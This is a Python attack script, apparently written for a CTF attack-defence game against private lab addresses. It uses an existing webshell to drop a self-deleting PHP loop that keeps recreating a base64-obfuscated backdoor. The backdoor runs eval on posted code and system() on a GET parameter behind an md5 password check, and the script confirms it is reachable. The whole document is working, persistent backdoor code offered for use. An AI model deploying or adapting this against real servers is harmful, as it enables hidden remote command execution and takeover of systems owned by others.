import requests
import time

s = requests.session()
host_list = "192.168.128.132"
passwd = "222"


d_data = {
	"user":"ryan",
	"password":"ryan",
	"Headers":{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"},
	"cookies":"",
	"flag_url":"http://192.168.128.132:8080/flag_file.php?token=team1&flag=",
	"base_url":""   #登录地址
}

def get_flag():
	global passwd,s,host_list,data
	cmd = {passwd:"file_put_contents('ryan_ux.php','<?php set_time_limit(0);ignore_user_abort(1);unlink(__FILE__);while(1){file_put_contents(\"a1.php\",base64_decode(\"PD9waHANCkAkZmxhZyA9ICRfR0VUWydmbGFnJ107QCRmZj0kX0dFVFsnZmYnXTtpZiAobWQ1KEAkX0dFVFsnYSddKSA9PT0gJ2MwZjFlNTc3MGE4YmQyNTljYTI3Y2NmOTUzMzMzZmNlJykge0BldmFsKCRfUE9TVFsneCddKTtpZigkZmY9PSdkd2onKXtlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRmbGFnKTt9ZWxzZXtzeXN0ZW0oJGZsYWcpO319Pz4=\"));sleep(10);}?>');"}
	for port in range(8801,8804):
		url = "http://" + host_list + f":{port}" + "/index.php?file=more&page=b1.555baidu.com.php"
		res = s.post(url,data = cmd)
		if res:
			print("Upload OK!")

	check_ma()


def check_ma():
	global passwd,s,host_list,data
	for port in range(8801,8804):
		url = "http://" + host_list + f":{port}" + "/ryan_ux.php"
		try:
			s.get(url,headers = d_data["Headers"],timeout = 2)
		except:
			pass
		url_ma = "http://" + host_list + f":{port}" + "/a1.php"
		res = s.get(url_ma,headers = d_data["Headers"])
		if res.status_code == 200:
			print("OK!")

get_flag()

# if __name__ == "__main__"
# 	get_flag()
# 	time.sleep(5)
